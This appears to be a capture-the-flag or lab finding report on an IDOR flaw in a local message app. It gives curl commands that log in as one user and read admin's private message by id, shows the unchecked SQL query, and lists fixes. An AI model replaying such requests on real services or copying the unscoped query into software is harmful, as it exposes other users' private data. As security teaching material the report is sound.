# Finding 2 — IDOR (Insecure Direct Object Reference)

- **Class:** Broken Object Level Authorization / IDOR (CWE-639) — OWASP A01:2021
- **Endpoint:** `GET /messages/<id>`
- **Severity:** High — any logged-in user reads any other user's private messages.
- **Flag:** `FLAG{idor_25b3a6bacc94}`

## Request (reproducible)
```bash
# 1) normal session as the handout user
curl -s -c cookies.txt \
  --data-urlencode "username=alice" --data-urlencode "password=password123" \
  http://127.0.0.1:5000/login
# 2) alice owns only #4 and #5; request admin's message by id
curl -s -b cookies.txt http://127.0.0.1:5000/messages/1
```

## Result (actual)
- `/messages` for alice lists only `#4 Grocery list` and `#5 Vacation`.
- `GET /messages/1` -> `200 OK`, body of admin's message:
  `#1 — Onboarding secret / To: admin / Internal only. Do not share. FLAG{idor_25b3a6bacc94}`

## Why it works
`message_detail` (app.py:259-270) looks up the row by id only:
```python
row = get_db().execute(
    "SELECT id, owner, title, body FROM messages WHERE id = ?", (msg_id,)
).fetchone()
```
It authenticates the user but never checks that `row.owner == user.username`,
so the object reference (the id) is enough to read anyone's message.

## Remediation
- Enforce an **ownership/authorization check** on every object fetch, e.g.
  `WHERE id = ? AND owner = ?`, or compare `row["owner"]` to the session user
  and return 403/404 on mismatch.
- Prefer server-side scoping of queries to the current user; do not rely on the
  UI hiding other ids.
- Consider unguessable identifiers (UUIDs) as defense-in-depth (not a substitute
  for the access check).

---

## Additional captured evidence (reproduction 2026-10-11)

- `poc/02_idor_baseline_login.txt` — legitimate `alice` login (`302`, cookie
  decodes to `alice:user`).
- `poc/02_idor_baseline_messages.txt` — **IDOR baseline**: Alice's own message
  list shows **only** `#4 — Grocery list` and `#5 — Vacation` (she does not own
  #1). This establishes that reading `/messages/1` is cross-user access.
